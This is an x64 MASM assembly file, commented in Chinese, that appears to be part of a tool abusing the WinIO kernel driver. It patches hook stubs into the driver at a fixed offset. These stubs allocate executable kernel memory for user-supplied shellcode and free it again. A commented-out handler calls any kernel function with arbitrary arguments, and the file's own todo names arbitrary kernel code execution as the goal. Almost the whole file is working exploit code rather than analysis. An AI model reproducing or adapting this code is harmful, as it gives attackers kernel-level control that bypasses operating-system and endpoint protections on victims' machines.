.code
; todo:任意内核代码执行
PUBLIC SetupHook 
PUBLIC SetupHookEnd
PUBLIC UninstHook
PUBLIC UninstHookEnd
; 0. c++ init时写入
; init时候直接写入，省的每次copy
PUBLIC slot_ExAllocatePoolWithTag
PUBLIC slot_MmSetPageProtection
PUBLIC slot_ExFreePoolWithTag

;   创建一片内存，把传入的任意大小shellcode写进去（不执行）
;   1.patch setup_hook at winio_base+0x1367
;   2.调用 winio.out
;   3.返回 status,buffer是分配内存的地址
SetupHook PROC
    jmp realSetupHook
slot_ExAllocatePoolWithTag QWORD 0
slot_MmSetPageProtection QWORD 0

realSetupHook:
    push rbx                            ; 放目标地址
    push r15                            ; buffer
    
    ; buffer输入参数：
    ; uint64 shellcode_size
    ; byte shellcode[code_size]
    ; 返回:入口点

    sub rsp, 20h

    mov r15, qword ptr [rdi+18h]        ; r15 = PVOID SystemBuffer      

    mov rcx, 0                          ; NonPagedPool
    mov rdx, [r15]                      ; size
    mov r8d, 'uMeR'                     ; tag
    call qword ptr [slot_ExAllocatePoolWithTag]
    test rax, rax
    jz SetupHookExit

    mov rbx, rax

    mov qword ptr [rdi+38h], 8          ; irp->IoStatus.Information = 8

    push rdi
    push rsi
    
    lea rsi, [r15+8]                    ; src = shellcode
    mov rdi, rbx                        ; dst = alloced
    lea rcx, [r15]                      ; Size
    cld
    rep movsb
    
    pop rsi
    pop rdi

    mov rcx, rax                        ; BaseAddress
    lea rdx, [r15]                      ; Size
    mov r8d, 10h                        ; NewProtection = PAGE_EXECUTE
    call qword ptr [slot_MmSetPageProtection]
    cmp rax,0
    js SetupHookExit

    mov [r15], rbx                      ; buffer = shellcode_ptr

SetupHookExit:
    add  rsp, 20h
    mov [rdi+30h], eax

    pop r15
    pop rbx

    jmp SetupHook+13bh ; dispatchEnd

SetupHook ENDP
SetupHookEnd:
    nop

; 删除前面setup创建的shellcode区
UninstHook PROC
    jmp realUninstHook
    slot_ExFreePoolWithTag QWORD 0
realUninstHook:
    sub rsp, 20h
    mov rax, qword ptr [rdi+18h]  ; rax = pvoid sysbuffer
    ; inbuffer:
    ; PVOID buff
    cmp qword ptr [rax],0         ; 只防free(NULL) 其他懒得实现了靠自觉吧qwq
    jz UninstHookExitE

    mov rcx, [rax]
    mov rdx, 'uMeR'               ; tag
    call qword ptr [slot_ExFreePoolWithTag]
    jmp UninstHookExit

UninstHookExitE:
    mov eax, 0c000000dh           ; STATUS_INVALID_PARAMETER
UninstHookExit:
    add rsp, 20h
    mov [rdi+30h], eax

    jmp UninstHook+13bh ; dispatchEnd
UninstHook ENDP
UninstHookEnd:
    nop
; hook_func PROC
;     ; call进来之前已经在winiosys内进行过cmp
;     je      fast_original_out

;     cmp     ecx, 'ReMu'
;     je      custom_ioctl_handler

;     jmp     fast_goto_error


; fast_original_out:
;     pop     r10                     ; r10 = 0x77136C, 同时恢复栈平衡
;     lea     r10, [r10 + 1]          ; r10 = 0x77136D (原 test eax, eax)
;     cmp     ecx, ecx                ; ZF=1 (=0x80102054, 原 jnz 不跳)
;     jmp     r10


; fast_goto_error:
;     pop     r10                     ; r10 = 0x77136C
;     lea     r10, [r10 + 12Eh]       ; r10 = 0x77149A (原 jnz 目标)
;     xor     ecx, ecx                ; ZF=0, SF=0 (cmp 语义：不等)
;     jmp     r10


; custom_ioctl_handler:
;     pushfq
;     push    rax
;     push    rcx
;     push    rdx
;     push    r8
;     push    r9
;     push    r10
;     push    r11
;     push    rbx
;     push    rbp
;     push    rdi
;     push    rsi
;     push    r12
;     push    r13
;     push    r14
;     push    r15

;     mov     rbp, rsp
;     sub     rsp, 20h                ; 局部变量

;      ; ─── 栈布局 ───
;     ;   [rbp+0x80] = 返回地址 (0x77136C)
;     ;   [rbp+0x78] = RFLAGS
;     ;   [rbp+0x70] = rax    (Options / 输入长度)
;     ;   [rbp+0x68] = rcx    (IOCTL 码)
;     ;   [rbp+0x60] = rdx    (IRP 指针)
;     ;   [rbp+0x58] = r8
;     ;   [rbp+0x50] = r9
;     ;   [rbp+0x48] = r10
;     ;   [rbp+0x40] = r11
;     ;   [rbp+0x38] = rbx    (SystemBuffer / 用户缓冲区)
;     ;   [rbp+0x30] = rbp
;     ;   [rbp+0x28] = rdi    (IRP 指针副本)
;     ;   [rbp+0x20] = rsi
;     ;   [rbp+0x18] = r12
;     ;   [rbp+0x10] = r13
;     ;   [rbp+0x08] = r14
;     ;   [rbp+0x00] = r15    saved rbp ← rbp points here
;     ;   [rbp-0x20] = 局部变量



;     ; ══════════════════════════════════════════════
;     ;  解析用户结构体: {uint32 type; uint32 arglen; uint64 args[]}
;     ;  type=0: args[0]=内核函数地址, args[1...]=参数
;     ; ══════════════════════════════════════════════

;     mov     r15d, [rbp+70h]        ; r15d = 输入缓冲区长度 (Options)
;     cmp     r15d, 16
;     jb      hook_error            ; 最小长度: 4+4+8 = 16

;     mov     rbx, [rbp+38h]         ; rbx = MasterIrp (用户缓冲区)
;     mov     eax, [rbx]             ; eax = type
;     test    eax, eax
;     jnz     hook_error            ; 非 type=0 → 错误

;     mov     r12d, [rbx+4]          ; r12 = arglen
;     cmp     r12d, 1
;     jb      hook_error            ; arglen < 1 (至少需要 funcptr)

;     ; 验证总长度: 8 + arglen*8 <= 输入长度
;     lea     eax, [r12*8 + 8]
;     cmp     r15d, eax
;     jb      hook_error

;     mov     r13, [rbx+8]           ; r13 = args[0] = funcptr
;     lea     r14, [rbx+16]          ; r14 = &args[1]
;     dec     r12d                   ; r12 = num_params (funcptr 不计入参数)

;     ; ─── 清空参数寄存器 ───
;     xor     ecx, ecx
;     xor     edx, edx
;     xor     r8d, r8d
;     xor     r9d, r9d

;     ; ─── 前 4 个参数 → rcx, rdx, r8, r9 ───
;     cmp     r12d, 0
;     je      prep_call
;     mov     rcx, [r14]
;     dec     r12d
;     jz      prep_call

;     mov     rdx, [r14+8]
;     dec     r12d
;     jz      prep_call

;     mov     r8, [r14+16]
;     dec     r12d
;     jz      prep_call

;     mov     r9, [r14+24]
;     dec     r12d
;     lea     r14, [r14+32]          ; r14 = &args[5]

; prep_call:
;     ; ─── 栈帧：shadow space(0x20) + 第 5+ 个参数 + 对齐填充 ───
;     mov     r15d, r12d
;     add     r15d, 4                ; + shadow space (4 qwords = 0x20)
;     test    r15d, 1
;     jz      al_ok
;     inc     r15d                   ; 总 qword 数为偶数 → 16 字节对齐
; al_ok:
;     shl     r15, 3                 ; r15 = 分配字节数 (始终 >= 0x20)
;     sub     rsp, r15               ; [rsp]..[rsp+1Fh] = shadow, [rsp+20h].. = 参数

;     cmp     r12d, 0
;     je      do_call                ; 无栈参数，shadow space 已就绪

;     xor     r10d, r10d
; copy_loop:
;     cmp     r10d, r12d
;     jae     do_call
;     mov     rax, [r14 + r10*8]
;     mov     [rsp + r10*8 + 20h], rax
;     inc     r10d
;     jmp     copy_loop

; do_call:
;     call    r13                    ; rax = 内核函数返回值 (NTSTATUS)
;     add     rsp, r15               ; 回收栈空间 (始终 >= 0x20)
;     mov     rdi, [rbp+28h]         ; rdi = 原始 IRP
;     mov     [rdi+30h], eax         ; irp->IoStatus.Status = 返回值
;     jmp     restore

; hook_error:
;     mov     rdi, [rbp+28h]
;     mov     dword ptr [rdi+30h], 0C000000Dh ; STATUS_INVALID_PARAMETER

; restore:
;     ; ─── 恢复环境 ───
;     add     rsp, 20h
;     pop     r15
;     pop     r14
;     pop     r13
;     pop     r12
;     pop     rsi
;     pop     rdi
;     pop     rbp
;     pop     rbx
;     pop     r11
;     pop     r10
;     pop     r9
;     pop     r8
;     pop     rdx
;     pop     rcx
;     pop     rax
;     popfq
;     pop     r10                     ; r10 = 0x77136C

;     ; 手动跳转到DispatchEnd
;     lea r10, [r10 + 136h] ; DispatchEnd
;     jmp r10


; hook_func ENDP
; hook_func_end LABEL PROC

    END